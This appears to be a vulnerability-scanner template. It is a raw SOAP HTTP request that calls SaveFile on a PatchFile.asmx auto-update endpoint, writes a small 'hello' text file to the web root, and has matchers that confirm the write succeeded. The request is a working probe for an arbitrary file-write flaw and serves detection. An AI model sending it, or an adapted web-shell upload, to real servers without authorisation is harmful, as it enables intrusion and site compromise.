POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Cookie: .ASPXANONYMOUS=1OJZqnZ03AEkAAAAZGQ2ZDU0NzYtMDdiZS00YWJhLTk2ZTMtNmRhYTgxNDM5OTNi0; ASP.NET_SessionId=md4bw5fgleu1cxfdwk4w0o4n
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveFile xmlns="http://tempuri.org/">
      <binData>aGVsbG8=</binData>
      <path>./</path>
      <fileName>a.txt</fileName>
    </SaveFile>
  </soap:Body>
</soap:Envelope>

#@ condition: and
#@ matcher: status_code == 200
#@ matcher: header["Content-Type"] contains "xml" 
#@ matcher: body contains "<?xml" && body contains "true"

